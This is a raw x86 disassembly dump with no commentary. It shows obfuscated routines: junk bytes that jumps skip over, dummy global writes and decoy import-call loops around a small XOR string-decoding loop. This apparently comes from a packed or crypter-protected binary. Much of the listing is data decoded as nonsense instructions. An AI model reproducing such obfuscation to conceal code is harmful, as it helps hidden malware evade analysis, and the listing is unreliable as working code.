  4109ec:	mov    ds,WORD PTR [edi+0x62]
  4109ef:	mov    eax,0xb6c9fd74
  4109f4:	lods   al,BYTE PTR ds:[esi]
  4109f5:	adc    dl,BYTE PTR ds:0xc293f534
  4109fb:	jmp    0x235b:0x5fb41b1a
  410a02:	sub    DWORD PTR [ebx+0x30c3a36d],ebp
  410a08:	push   ebp
  410a09:	lea    ebp,es:[ecx-0x37d66fd7]
  410a10:	nop
  410a11:	js     0x410a6d
  410a13:	dec    ecx
  410a14:	push   ebp
  410a15:	scas   eax,DWORD PTR es:[edi]
  410a16:	cmp    eax,0xded63ad4
  410a1b:	mov    dl,0x68
  410a1d:	push   ds
  410a1e:	xor    dh,ch
  410a20:	daa    
  410a21:	sti    
  410a22:	fimul  DWORD PTR [eax+0x6aa0ed8a]
  410a28:	lea    eax,[ecx+eiz*8]
  410a2b:	aad    0xe2
  410a2d:	scas   eax,DWORD PTR es:[edi]
  410a2e:	mov    ecx,0x8e527e4d
  410a33:	ins    DWORD PTR es:[edi],dx
  410a34:	fincstp 
  410a36:	(bad)  
  410a37:	fdiv   st(1),st
  410a39:	cs dec ebp
  410a3b:	in     eax,0x13
  410a3d:	addr16 xchg dl,dh
  410a40:	cwde   
  410a41:	fild   QWORD PTR [eax+0x7b129524]
  410a47:	or     cl,ah
  410a49:	cmc    
  410a4a:	daa    
  410a4b:	dec    ebx
  410a4c:	cmp    ah,BYTE PTR [ebp+0x48]
  410a4f:	fs xor ah,bl
  410a52:	sbb    BYTE PTR [edi],0xb8
  410a55:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  410a5b:	leave  
  410a5c:	ret    0xc
  410a5f:	push   ebp
  410a60:	mov    ebp,esp
  410a62:	mov    eax,DWORD PTR [ebp+0xc]
  410a65:	xor    edx,edx
  410a67:	mov    ecx,0x7264fca9
  410a6c:	div    ecx
  410a6e:	mov    ecx,DWORD PTR [ebp+0x10]
  410a71:	and    ecx,eax
  410a73:	or     ecx,0x81161d8f
  410a79:	mov    eax,ecx
  410a7b:	pop    ebp
  410a7c:	ret    0x18
  410a7f:	push   ebp
  410a80:	mov    ebp,esp
  410a82:	sub    esp,0x58
  410a85:	xor    DWORD PTR ds:0x433867,ecx
  410a8b:	mov    ecx,DWORD PTR [ebp+0x8]
  410a8e:	movzx  eax,WORD PTR ds:0x43383f
  410a95:	sbb    eax,DWORD PTR ds:0x4338c3
  410a9b:	mov    ds:0x43383f,eax
  410aa0:	mov    eax,0x8a3c
  410aa5:	xor    ax,WORD PTR [ecx+0x20]
  410aa9:	and    DWORD PTR ds:0x433837,0x43387f
  410ab3:	mov    ecx,0x3b02
  410ab8:	add    ax,cx
  410abb:	and    DWORD PTR ds:0x43382f,0x7f6b
  410ac5:	movzx  eax,ax
  410ac8:	xor    DWORD PTR ds:0x4337e7,0x6006
  410ad2:	mov    DWORD PTR [ebp-0xc],eax
  410ad5:	mov    BYTE PTR [ebp-0x1],0x7f
  410ad9:	adc    ecx,0x1b78
  410adf:	lea    eax,[ebp-0x1]
  410ae2:	mov    DWORD PTR [ebp-0x10],eax
  410ae5:	adc    ecx,DWORD PTR ds:0x433877
  410aeb:	mov    al,BYTE PTR [ebp-0x1]
  410aee:	mov    ecx,DWORD PTR [ebp-0x10]
  410af1:	xor    al,0x46
  410af3:	sub    al,0x38
  410af5:	adc    DWORD PTR ds:0x4337ab,0x4337b7
  410aff:	mov    BYTE PTR [ecx],al
  410b01:	xor    eax,eax
  410b03:	xor    eax,DWORD PTR ds:0x4337ab
  410b09:	sbb    DWORD PTR ds:0x4337f3,eax
  410b0f:	jmp    0x410cab
  410b14:	add    DWORD PTR [ecx-0x1ca338a4],eax
  410b1a:	mov    eax,ds:0xb67bce41
  410b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b20:	(bad)  
  410b21:	push   ss
  410b22:	pop    esp
  410b23:	mov    esi,0x7e7e460d
  410b28:	icebp  
  410b29:	jg     0x410ba9
  410b2b:	jle    0x410b3f
  410b2d:	mov    WORD PTR [ebx-0x6e],ss
  410b30:	mov    ah,0x78
  410b32:	call   esp
  410b34:	mov    ebp,0x5b880129
  410b39:	sbb    BYTE PTR [edi-0x38585c18],0xce
  410b40:	shr    BYTE PTR [edx],1
  410b42:	and    dh,BYTE PTR [ebx+0x6496004]
  410b48:	push   esp
  410b49:	pop    ebx
  410b4a:	mov    ah,0xc6
  410b4c:	cmp    al,dh
  410b4e:	mov    eax,0x60a2832e
  410b53:	scas   al,BYTE PTR es:[edi]
  410b54:	mov    ds:0xf3878b6b,eax
  410b59:	sub    eax,DWORD PTR [esi-0x243b124e]
  410b5f:	fwait
  410b60:	mov    al,0xb9
  410b62:	scas   al,BYTE PTR es:[edi]
  410b63:	loop   0x410b76
  410b65:	adc    eax,0xfafc99d8
  410b6a:	(bad)  
  410b6b:	cmp    esi,ebx
  410b6d:	inc    esp
  410b6e:	dec    edi
  410b6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b70:	or     al,0x4e
  410b72:	(bad)  
  410b73:	mov    ch,0x19
  410b75:	les    ecx,FWORD PTR [ecx]
  410b77:	imul   ebx,DWORD PTR [edx],0x59
  410b7a:	imul   edx,DWORD PTR [esi],0xffffffb4
  410b7d:	jge    0x410bc7
  410b7f:	lahf   
  410b80:	inc    esi
  410b81:	xor    bh,BYTE PTR [edi]
  410b83:	daa    
  410b84:	(bad)  
  410b85:	fild   WORD PTR [edx]
  410b87:	cmp    BYTE PTR [esi+ecx*2-0x4b],cl
  410b8b:	add    DWORD PTR [eax+eiz*1-0x17106c03],0x2e5aa130
  410b96:	ds mov edx,esi
  410b99:	xor    DWORD PTR [esi],ebx
  410b9b:	stc    
  410b9c:	std    
  410b9d:	in     al,0xdc
  410b9f:	cmc    
  410ba0:	(bad)  
  410ba1:	popf   
  410ba2:	pop    edx
  410ba3:	sbb    BYTE PTR [eax+edx*8+0x4ed5242e],0x8e
  410bab:	shl    DWORD PTR [edx+0x74047a40],1
  410bb1:	and    BYTE PTR [ebx+0x5b],dh
  410bb4:	ja     0x410b5b
  410bb6:	adc    eax,0x8d2f207f
  410bbb:	xchg   edx,eax
  410bbc:	cs xor al,0x31
  410bbf:	jge    0x410c14
  410bc1:	inc    edx
  410bc2:	dec    esi
  410bc3:	dec    edx
  410bc4:	push   edx
  410bc5:	pop    edi
  410bc6:	cs (bad) 
  410bc8:	jne    0x410b70
  410bca:	(bad)  
  410bcb:	adc    ch,ch
  410bcd:	mov    ebp,0x4bc53e0d
  410bd2:	and    BYTE PTR [edx+eiz*2],ah
  410bd5:	and    BYTE PTR [ebx+0x20],cl
  410bd8:	cs mov dh,0x3a
  410bdb:	repz xor DWORD PTR [ecx-0x41d1044f],0x607edfaf
  410be6:	popf   
  410be7:	jb     0x410bc4
  410be9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bea:	mov    esi,0x4465da2f
  410bef:	pop    esp
  410bf0:	lds    esi,FWORD PTR [ebx+0x524d181e]
  410bf6:	sbb    ecx,DWORD PTR [ebp-0x6d]
  410bf9:	mov    al,ds:0x86fcc482
  410bfe:	popa   
  410bff:	sahf   
  410c00:	test   BYTE PTR ds:0xa6d2d000,0xdc
  410c07:	in     eax,0x9f
  410c09:	in     eax,0xa4
  410c0b:	xor    eax,0x770916dd
  410c10:	test   ah,0xb1
  410c13:	call   0xdbaf:0x1c1a48f4
  410c1a:	fsub   st,st(0)
  410c1c:	aas    
  410c1d:	aas    
  410c1e:	mov    es,WORD PTR ds:0xb907a5cf
  410c24:	stos   DWORD PTR es:[edi],eax
  410c25:	sbb    bh,BYTE PTR [ebx]
  410c27:	sub    eax,0x1fde1222
  410c2c:	adc    bh,ch
  410c2e:	test   eax,0xc747769a
  410c33:	pop    ecx
  410c34:	lods   al,BYTE PTR ds:[esi]
  410c35:	mov    al,ds:0x3e829d9
  410c3a:	push   esp
  410c3b:	adc    BYTE PTR [eax],dh
  410c3d:	dec    eax
  410c3e:	sbb    ebx,DWORD PTR [ebx]
  410c40:	mov    ds:0x2a5e7a83,al
  410c45:	cli    
  410c46:	stos   BYTE PTR es:[edi],al
  410c47:	lods   al,BYTE PTR ds:[esi]
  410c48:	mov    ch,0xd5
  410c4a:	jl     0x410c8d
  410c4c:	mov    edx,0x58674461
  410c51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c52:	out    0xaf,eax
  410c54:	lds    ecx,FWORD PTR [ebp+edx*8+0x7f]
  410c58:	dec    edi
  410c59:	adc    eax,0x5ea25a3b
  410c5e:	inc    edx
  410c5f:	inc    bl
  410c61:	inc    eax
  410c62:	retf   
  410c63:	cmp    al,BYTE PTR [esi-0x4f]
  410c66:	aaa    
  410c67:	sub    al,0xe9
  410c69:	add    eax,0xc315022e
  410c6e:	fistp  QWORD PTR [esi+0x189707ca]
  410c74:	or     ah,BYTE PTR [edx+0x41]
  410c77:	dec    edi
  410c78:	sbb    ah,bl
  410c7a:	aam    0x4d
  410c7c:	push   es
  410c7d:	loopne 0x410c07
  410c7f:	cmp    bh,cl
  410c81:	fisttp DWORD PTR ds:0x15a56704
  410c87:	pop    ecx
  410c88:	dec    esp
  410c89:	push   ebp
  410c8a:	rcl    BYTE PTR [ebx+0x6a41dfe5],0xa0
  410c91:	je     0x410c7c
  410c93:	inc    edx
  410c94:	ins    DWORD PTR es:[edi],dx
  410c95:	cmp    dh,BYTE PTR [edx]
  410c97:	out    0x39,eax
  410c99:	lds    esp,FWORD PTR [esi-0x31]
  410c9c:	jbe    0x410cc2
  410c9e:	lock repnz idiv DWORD PTR [ebx+ecx*2]
  410ca3:	mov    WORD PTR [ecx+0x462e99c4],?
  410ca9:	fild   WORD PTR [edi+eax*8]
  410cac:	inc    ebp
  410cad:	clc    
  410cae:	xor    DWORD PTR [ebp-0x3ff40764],eax
  410cb4:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  410cbb:	mov    eax,DWORD PTR [ebp-0x8]
  410cbe:	or     DWORD PTR ds:0x43386f,0x3fd0
  410cc8:	mov    ecx,0x7510854
  410ccd:	mov    DWORD PTR ds:0x4337af,0x62c3
  410cd7:	push   esi
  410cd8:	xor    eax,ecx
  410cda:	or     esi,DWORD PTR ds:0x4337af
  410ce0:	mov    esi,0x32729b
  410ce5:	add    eax,esi
  410ce7:	jmp    0x410cfe
  410cec:	mov    dl,BYTE PTR [ebp-0x1]
  410cef:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  410cf3:	mov    DWORD PTR ds:0x4337af,0x530d
  410cfd:	inc    eax
  410cfe:	mov    DWORD PTR ds:0x4337eb,0x3584
  410d08:	cmp    eax,0x40
  410d0b:	mov    DWORD PTR ds:0x4337ff,0x3d5c
  410d15:	jb     0x410cec
  410d1b:	mov    eax,ds:0x4337af
  410d20:	add    eax,DWORD PTR ds:0x433883
  410d26:	mov    ds:0x4337af,eax
  410d2b:	mov    edx,DWORD PTR [ebp-0x8]
  410d2e:	mov    DWORD PTR ds:0x4338bf,0x17
  410d38:	cmp    DWORD PTR ds:0x4338bf,0x0
  410d3f:	je     0x410d94
  410d45:	cmp    DWORD PTR ds:0x4338bf,0x4
  410d4c:	jne    0x410d69
  410d52:	push   DWORD PTR [ebp-0x20]
  410d55:	push   DWORD PTR [ebp-0x28]
  410d58:	push   DWORD PTR [ebp-0xc]
  410d5b:	push   DWORD PTR [ebp-0x1c]
  410d5e:	push   0x2fed
  410d63:	call   DWORD PTR ds:0x4123b0
  410d69:	cmp    DWORD PTR ds:0x4338bf,0x5
  410d70:	jne    0x410d84
  410d76:	xor    eax,eax
  410d78:	xor    eax,DWORD PTR ds:0x4338bf
  410d7e:	dec    eax
  410d7f:	mov    ds:0x4338bf,eax
  410d84:	mov    eax,ds:0x4338bf
  410d89:	dec    eax
  410d8a:	mov    ds:0x4338bf,eax
  410d8f:	jmp    0x410d38
  410d94:	mov    eax,DWORD PTR [ebp-0xc]
  410d97:	add    DWORD PTR ds:0x4337a3,0x2cfa
  410da1:	xor    edx,ecx
  410da3:	sbb    DWORD PTR ds:0x4338bb,0x4112
  410dad:	add    edx,esi
  410daf:	mov    DWORD PTR ds:0x433833,0x2f1c
  410db9:	cmp    edx,eax
  410dbb:	jmp    0x410f57
  410dc0:	adc    al,0x14
  410dc2:	in     al,0x8b
  410dc4:	in     al,0x6b
  410dc6:	jno    0x410d59
  410dc8:	aad    0x1d
  410dca:	dec    ebx
  410dcb:	add    ch,BYTE PTR [ebx+0x0]
  410dce:	hlt    
  410dcf:	ror    BYTE PTR [edi+eax*2+0x7ff17e7e],0x7e
  410dd7:	jle    0x410d5f
  410dd9:	or     BYTE PTR [ebx-0x9],bh
  410ddc:	ret    
  410ddd:	inc    ecx
  410dde:	push   edx
  410ddf:	js     0x410dd7
  410de1:	xor    al,0x81
  410de3:	cli    
  410de4:	iret   
  410de5:	aas    
  410de6:	xor    eax,0xeb2049a
  410deb:	aas    
  410dec:	pop    ecx
  410ded:	jecxz  0x410dd6
  410def:	loopne 0x410e08
  410df1:	inc    esp
  410df2:	xor    BYTE PTR [esi+ebx*8-0x48],cl
  410df6:	push   0x791a497
  410dfb:	push   ebx
  410dfc:	in     al,dx
  410dfd:	mov    al,ds:0x572ae612
  410e02:	mov    esi,0xadd69c39
  410e07:	cmp    al,0x80
  410e09:	ror    BYTE PTR [esi-0x7ce3c79b],cl
  410e0f:	popf   
  410e10:	aad    0x7f
  410e12:	mov    ebx,DWORD PTR es:[ebp+0x33]
  410e16:	out    dx,al
  410e17:	push   ds
  410e18:	lds    edi,FWORD PTR [ebp-0x24]
  410e1b:	jmp    0x410e3f
  410e1d:	mov    ds:0x5382669b,al
  410e22:	gs xchg esp,eax
  410e24:	pop    ss
  410e25:	add    al,0xc9
  410e27:	inc    ebp
  410e28:	and    ebx,esp
  410e2a:	mov    ch,0x77
  410e2c:	imul   ebp,DWORD PTR [edx-0x5c8b1033],0xffffff8c
  410e33:	sub    al,0x51
  410e35:	call   0xf092:0x73766a1f
  410e3c:	sar    BYTE PTR [esi-0x77],cl
  410e3f:	(bad)  
  410e40:	sub    edx,esi
  410e42:	retf   0xc7d6
  410e45:	fisttp DWORD PTR [ecx-0x5a]
  410e48:	mov    bh,0xc8
  410e4a:	pusha  
  410e4b:	adc    ah,ch
  410e4d:	inc    BYTE PTR [ecx+0xb430c4a]
  410e53:	sub    edx,ecx
  410e55:	mov    BYTE PTR [edx+0x67],dh
  410e58:	xor    dh,BYTE PTR ds:0x2c1972cb
  410e5e:	popa   
  410e5f:	adc    eax,0x9fc59f7f
  410e64:	pop    ecx
  410e65:	aam    0x4e
  410e67:	call   0x4ed0550b
  410e6c:	scas   eax,DWORD PTR es:[edi]
  410e6d:	out    0x64,al
  410e6f:	jmp    0x410e28
  410e71:	push   ecx
  410e72:	push   0x670e3c76
  410e77:	mov    esi,0x49b810bd
  410e7c:	and    eax,0xcf60190
  410e81:	out    dx,al
  410e82:	mov    al,0x2e
  410e84:	rcl    BYTE PTR [eax-0x54],cl
  410e87:	lahf   
  410e88:	gs scas al,BYTE PTR es:[edi]
  410e8a:	call   DWORD PTR [ebx-0xb5faab6]
  410e90:	sbb    BYTE PTR [eax],ch
  410e92:	dec    ebp
  410e93:	adc    DWORD PTR [edi-0x2c6c78e],eax
  410e99:	add    esp,esi
  410e9b:	mov    esi,0x231b4543
  410ea0:	pop    ecx
  410ea1:	sbb    eax,0x9ed41a8d
  410ea6:	(bad)  
  410ea7:	repz dec esp
  410ea9:	sti    
  410eaa:	mov    ah,0xcc
  410eac:	add    ah,BYTE PTR [ebp+0x12]
  410eaf:	cmp    ecx,edx
  410eb1:	sub    cl,BYTE PTR [ecx]
  410eb3:	sbb    bl,bl
  410eb5:	mov    cl,0x4f
  410eb7:	out    dx,al
  410eb8:	push   0xffffffbf
  410eba:	sub    ebx,DWORD PTR [ebx-0x76c079d2]
  410ec0:	xchg   ebx,eax
  410ec1:	pop    ebx
  410ec2:	bound  edi,QWORD PTR [esi+esi*2+0x3906bbea]
  410ec9:	xchg   ecx,eax
  410eca:	xor    BYTE PTR [ebx-0x6d1094e8],ah
  410ed0:	cmp    al,0x57
  410ed2:	xor    al,0x89
  410ed4:	(bad)  
  410ed5:	fcmovnb st,st(2)
  410ed7:	cwde   
  410ed8:	pop    ds
  410ed9:	jo     0x410ee7
  410edb:	dec    edx
  410edc:	sar    BYTE PTR [eax+0x66],1
  410edf:	in     al,0x5f
  410ee1:	sbb    edi,esp
  410ee3:	add    BYTE PTR [ecx+0x469b6a9f],0x2b
  410eea:	adc    ah,al
  410eec:	mov    bl,0x37
  410eee:	nop
  410eef:	(bad)
  410ef2:	xchg   ebp,eax
  410ef3:	pop    edi
  410ef4:	mov    esi,0x9964a9b4
  410ef9:	sub    BYTE PTR [edx+0x2ac6a472],al
  410eff:	or     edx,DWORD PTR [ebx]
  410f01:	sbb    DWORD PTR [esi],esi
  410f03:	ss sbb ebx,ecx
  410f06:	popa   
  410f07:	fs stos DWORD PTR es:[edi],eax
  410f09:	jp     0x410f62
  410f0b:	test   eax,0xfa84c1f5
  410f11:	ret    
  410f12:	mov    BYTE PTR [esi+eax*1+0x9],ch
  410f16:	xor    BYTE PTR [ebp+0x16],dl
  410f19:	adc    al,0xa6
  410f1b:	(bad)  
  410f1c:	data16 jle 0x410eb3
  410f1f:	inc    esi
  410f20:	int3   
  410f21:	aas    
  410f22:	inc    edx
  410f23:	mov    dl,0xcb
  410f25:	pop    ds
  410f26:	mov    ds:0x6e8f32ab,al
  410f2b:	mov    edx,0x252a3f17
  410f30:	mov    esp,0xbc111544
  410f35:	push   es
  410f36:	mov    eax,0xaa32fc9d
  410f3b:	cld    
  410f3c:	pop    esi
  410f3d:	sub    BYTE PTR [ecx+0x7e],dl
  410f40:	mov    WORD PTR [edi+eiz*2+0x8],fs
  410f44:	jl     0x410f24
  410f46:	jmp    0xe5c3:0x7a47259d
  410f4d:	jl     0x410ee7
  410f4f:	mov    ebp,0x32677bf9
  410f54:	repz jbe 0x410ee9
  410f57:	je     0x4111b4
  410f5d:	xor    eax,eax
  410f5f:	add    eax,DWORD PTR ds:0x4338af
  410f65:	sub    DWORD PTR ds:0x4338b3,eax
  410f6b:	push   ebx
  410f6c:	sub    eax,0x37b3
  410f71:	push   edi
  410f72:	mov    DWORD PTR ds:0x4337ff,0x14
  410f7c:	cmp    DWORD PTR ds:0x4337ff,0x0
  410f83:	je     0x410fda
  410f89:	cmp    DWORD PTR ds:0x4337ff,0x2
  410f90:	jne    0x410fac
  410f96:	push   0x433833
  410f9b:	push   DWORD PTR [ebp-0x24]
  410f9e:	push   DWORD PTR [ebp-0x24]
  410fa1:	push   0x4a42
  410fa6:	call   DWORD PTR ds:0x4123b4
  410fac:	cmp    DWORD PTR ds:0x4337ff,0x3
  410fb3:	jne    0x410fc6
  410fb9:	mov    edi,DWORD PTR ds:0x4337ff
  410fbf:	dec    edi
  410fc0:	mov    DWORD PTR ds:0x4337ff,edi
  410fc6:	xor    edi,edi
  410fc8:	or     edi,DWORD PTR ds:0x4337ff
  410fce:	dec    edi
  410fcf:	mov    DWORD PTR ds:0x4337ff,edi
  410fd5:	jmp    0x410f7c
  410fda:	mov    edi,DWORD PTR [ebp+0x8]
  410fdd:	mov    eax,0x8a3c
  410fe2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410fe7:	jmp    0x411183
  410fec:	mov    dh,0xd4
  410fee:	ja     0x411052
  410ff0:	jne    0x411053
  410ff2:	mov    bl,0xd0
  410ff4:	ins    DWORD PTR es:[edi],dx
  410ff5:	push   edi
  410ff6:	push   ss
  410ff7:	push   ecx
  410ff8:	mov    ebp,0xf0acceb
  410ffd:	inc    ebp
  410ffe:	jle    0x41107e
  411000:	icebp  
  411001:	jg     0x411081
  411003:	jle    0x411004
  411005:	cld    
  411006:	inc    ebx
  411007:	repz jecxz 0x411034
  41100a:	adc    eax,0xc0ac2d21
  41100f:	ins    BYTE PTR es:[edi],dx
  411010:	(bad)  
  411011:	jg     0x411028
  411013:	repnz pop esi
  411015:	(bad)  
  411016:	jmp    DWORD PTR [esi]
  411018:	or     al,0xed
  41101a:	lods   al,BYTE PTR ds:[esi]
  41101b:	clc    
  41101c:	inc    ecx
  41101d:	cli    
  41101e:	mov    esi,0xfbd0a6
  411023:	fs inc edx
  411025:	leave  
  411026:	leave  
  411027:	dec    ebp
  411028:	pop    ebx
  411029:	pop    esi
  41102a:	sti    
  41102b:	add    DWORD PTR [eax+ecx*2+0x585d5f56],ebx
  411032:	add    eax,0x81c457d6
  411037:	dec    ebp
  411038:	arpl   WORD PTR [eax-0x760f1afe],ax
  41103e:	inc    ecx
  41103f:	nop
  411040:	dec    ebp
  411041:	sahf   
  411042:	aaa    
  411043:	inc    ecx
  411044:	push   esi
  411045:	mov    dh,0xd1
  411047:	and    al,0x99
  411049:	aam    0xa9
  41104b:	or     BYTE PTR [esi+0x72a0ca47],0x8f
  411052:	sar    ebx,0x17
  411055:	adc    al,0x8f
  411057:	dec    esi
  411058:	fstp   TBYTE PTR ds:0x22f00c80
  41105e:	hlt    
  41105f:	rcl    DWORD PTR [ebx-0x65],cl
  411062:	sar    cl,cl
  411064:	cmp    edx,DWORD PTR [eax+0x61]
  411067:	xchg   esi,eax
  411068:	mov    eax,0xbd84283f
  41106d:	ror    bh,1
  41106f:	sub    eax,0xa6ecc67c
  411074:	pop    esp
  411075:	pusha  
  411076:	stos   DWORD PTR es:[edi],eax
  411077:	sahf   
  411078:	(bad)  
  411079:	dec    esi
  41107a:	out    0x8b,eax
  41107c:	das    
  41107d:	dec    esi
  41107e:	mov    ebp,0xe734dc13
  411083:	cwde   
  411084:	or     al,0xaf
  411086:	rcl    DWORD PTR [ebp+0x19857e66],1
  41108c:	push   es
  41108d:	sbb    BYTE PTR [edi],bh
  41108f:	loope  0x4110cf
  411091:	xlat   BYTE PTR ds:[ebx]
  411092:	jecxz  0x41108c
  411094:	into   
  411095:	retf   0xf886
  411098:	lds    edi,FWORD PTR [ecx-0x7f]
  41109b:	add    ecx,eax
  41109d:	xor    bl,BYTE PTR [ebx-0x6a]
  4110a0:	add    eax,0xb36fec6c
  4110a5:	outs   dx,DWORD PTR ds:[esi]
  4110a6:	mov    al,ds:0x8da0f164
  4110ab:	cmp    al,ah
  4110ad:	ja     0x411103
  4110af:	push   ebx
  4110b0:	push   ecx
  4110b1:	scas   al,BYTE PTR es:[edi]
  4110b2:	push   ebx
  4110b3:	dec    ecx
  4110b4:	pusha  
  4110b5:	imul   ecx,DWORD PTR [edi+0x59],0x554948af
  4110bc:	and    ebp,DWORD PTR [eax-0x73]
  4110bf:	xor    BYTE PTR [ecx+0x68],ah
  4110c2:	jnp    0x41107c
  4110c4:	jmp    0x411065
  4110c6:	rcr    ebx,cl
  4110c8:	ja     0x411067
  4110ca:	in     eax,dx
  4110cb:	pop    es
  4110cc:	pop    es
  4110cd:	enter  0xffa6,0xbd
  4110d1:	inc    esi
  4110d2:	mov    dl,0xd7
  4110d4:	scas   eax,DWORD PTR es:[edi]
  4110d5:	mov    ds:0xfa7a2562,eax
  4110da:	clc    
  4110db:	imul   DWORD PTR [ebp+0x6e]
  4110de:	es int3 
  4110e0:	pushf  
  4110e1:	sub    ebx,DWORD PTR [ebx-0x355af68f]
  4110e7:	inc    edi
  4110e8:	cmp    DWORD PTR [edx+eax*1+0x1efee0ad],esp
  4110ef:	clc    
  4110f0:	lea    eax,[eax+0x68]
  4110f3:	(bad)  
  4110f4:	js     0x411138
  4110f6:	lahf   
  4110f7:	adc    DWORD PTR [edx+0x7aeb3fe9],edx
  4110fd:	xchg   ebp,eax
  4110fe:	push   esi
  4110ff:	inc    esi
  411100:	jbe    0x411085
  411102:	(bad)  
  411103:	push   0x22
  411105:	pop    es
  411106:	inc    ecx
  411107:	dec    ecx
  411108:	ret    
  411109:	xchg   ecx,eax
  41110a:	dec    esp
  41110b:	je     0x411181
  41110d:	push   ebx
  41110e:	dec    ecx
  41110f:	loopne 0x411109
  411111:	lods   eax,DWORD PTR ds:[esi]
  411112:	push   ds
  411113:	pop    ecx
  411114:	push   cs
  411115:	jae    0x411181
  411117:	push   0x70
  411119:	jb     0x411172
  41111b:	bound  ebp,QWORD PTR [ecx+edi*2-0x2b]
  41111f:	dec    ebx
  411120:	(bad)  
  411122:	popf   
  411123:	or     bl,ah
  411125:	xlat   BYTE PTR ds:[ebx]
  411126:	sub    eax,0x61cd01f1
  41112b:	ficom  WORD PTR ds:0x3fb83a6e
  411131:	jo     0x41116f
  411133:	test   eax,0x7577d0ca
  411138:	sub    eax,0x6278328b
  41113d:	(bad)  
  41113e:	outs   dx,DWORD PTR ds:[esi]
  41113f:	inc    edi
  411140:	xor    al,0xb8
  411142:	ins    DWORD PTR es:[edi],dx
  411143:	ins    BYTE PTR es:[edi],dx
  411144:	xor    eax,0x64710ce2
  411149:	mov    ebx,0x3149187a
  41114e:	sub    al,0xf1
  411150:	dec    ebx
  411151:	dec    ecx
  411152:	xor    ecx,DWORD PTR [edi]
  411154:	ja     0x4110db
  411156:	(bad)
  41115a:	and    eax,0x7b8db43a
  41115f:	lods   eax,DWORD PTR ds:[esi]
  411160:	out    0x71,eax
  411162:	pop    eax
  411163:	neg    DWORD PTR [ecx+0x2c]
  411166:	int3   
  411167:	pop    ecx
  411168:	hlt    
  411169:	stos   BYTE PTR es:[edi],al
  41116a:	pop    eax
  41116b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41116c:	inc    ebx
  41116d:	mov    DWORD PTR [ebx-0x7b],edi
  411170:	jo     0x41113e
  411172:	outs   dx,DWORD PTR ds:[esi]
  411173:	add    al,0xa9
  411175:	outs   dx,BYTE PTR ds:[esi]
  411176:	ins    BYTE PTR es:[edi],dx
  411177:	shl    DWORD PTR [ebx-0x623846e5],0x84
  41117e:	push   0xffffff80
  411180:	xor    BYTE PTR [edx],dl
  411182:	cmp    DWORD PTR [edi+0x3b02],0x66
  411189:	add    eax,edi
  41118b:	movzx  eax,ax
  41118e:	mov    DWORD PTR [ebp-0x14],eax
  411191:	mov    eax,DWORD PTR [ebp+0x8]
  411194:	movzx  eax,WORD PTR [eax+edx*4]
  411198:	xor    eax,0x8a3c
  41119d:	add    eax,edi
  41119f:	mov    edi,DWORD PTR [ebp-0x14]
  4111a2:	mov    BYTE PTR [ebp+edi*1-0x58],al
  4111a6:	mov    eax,DWORD PTR [ebp-0xc]
  4111a9:	inc    edx
  4111aa:	cmp    edx,eax
  4111ac:	jne    0x410f72
  4111b2:	pop    edi
  4111b3:	pop    ebx
  4111b4:	mov    eax,DWORD PTR [ebp-0x8]
  4111b7:	mov    edx,DWORD PTR [ebp+0x10]
  4111ba:	xor    eax,ecx
  4111bc:	add    eax,esi
  4111be:	mov    DWORD PTR [edx],eax
  4111c0:	mov    eax,DWORD PTR [ebp-0x8]
  4111c3:	xor    eax,ecx
  4111c5:	add    eax,esi
  4111c7:	mov    DWORD PTR [ebp+0x8],eax
  4111ca:	mov    eax,DWORD PTR [ebp+0x8]
  4111cd:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4111d1:	mov    dl,BYTE PTR [ebp-0x1]
  4111d4:	cmp    al,dl
  4111d6:	je     0x4113b5
  4111dc:	mov    eax,DWORD PTR [ebp+0x8]
  4111df:	jmp    0x41137b
  4111e4:	mov    ah,0x98
  4111e6:	adc    al,ch
  4111e8:	adc    dh,BYTE PTR [ebp+0x71]
  4111eb:	imul   ebx,ebp,0x6bdabba7
  4111f1:	scas   al,BYTE PTR es:[edi]
  4111f2:	es jle 0xf1bf903b
  4111f9:	jg     0x411279
  4111fb:	jle    0x4111dc
  4111fd:	in     eax,0x10
  4111ff:	stos   DWORD PTR es:[edi],eax
  411200:	pop    eax
  411201:	push   edi
  411202:	stos   BYTE PTR es:[edi],al
  411203:	repnz cmp edi,DWORD PTR [edx]
  411206:	out    0xd7,al
  411208:	fcmovbe st,st(6)
  41120a:	inc    esi
  41120b:	lock jle 0x411191
  41120e:	and    dl,BYTE PTR [edx+eax*4]
  411211:	xchg   ebp,eax
  411212:	mov    ds:0xdb5fb6a0,al
  411217:	add    DWORD PTR [edx+0x3d],ebx
  41121a:	icebp  
  41121b:	push   0xa77597be
  411220:	pop    ss
  411221:	and    BYTE PTR ds:0x264ca65d,al
  411227:	das    
  411228:	imul   edi
  41122a:	fidiv  DWORD PTR [edx-0x7a]
  41122d:	mov    eax,ds:0xc6ceb1e8
  411232:	call   0xa9cbdbbc
  411237:	inc    ebp
  411238:	adc    ebx,DWORD PTR [ecx-0x32]
  41123b:	(bad)  
  41123c:	fisubr DWORD PTR [edi+ebp*1]
  41123f:	in     al,dx
  411240:	lea    ebx,[edi+eiz*2+0x508ba2fd]
  411247:	mov    cl,0x7
  411249:	pop    ebx
  41124a:	adc    al,0x6c
  41124c:	pop    edx
  41124d:	inc    ebx
  41124e:	dec    eax
  41124f:	stos   DWORD PTR es:[edi],eax
  411250:	les    esi,FWORD PTR [ebp-0x7d]
  411253:	jae    0x411265
  411255:	sbb    BYTE PTR [ecx],cl
  411257:	test   eax,0xa0875829
  41125c:	outs   dx,DWORD PTR ds:[esi]
  41125d:	(bad)
  411260:	imul   edx,esi,0xa90e41be
  411266:	stos   DWORD PTR es:[edi],eax
  411267:	jae    0x4112db
  411269:	js     0x41126c
  41126b:	jl     0x411224
  41126d:	jl     0x4112a9
  41126f:	dec    esp
  411270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411271:	sub    eax,0xff4a803e
  411276:	in     al,dx
  411277:	je     0x4112dd
  411279:	loopne 0x411256
  41127b:	push   0xfffffffa
  41127d:	push   ss
  41127e:	fadd   QWORD PTR [eax]
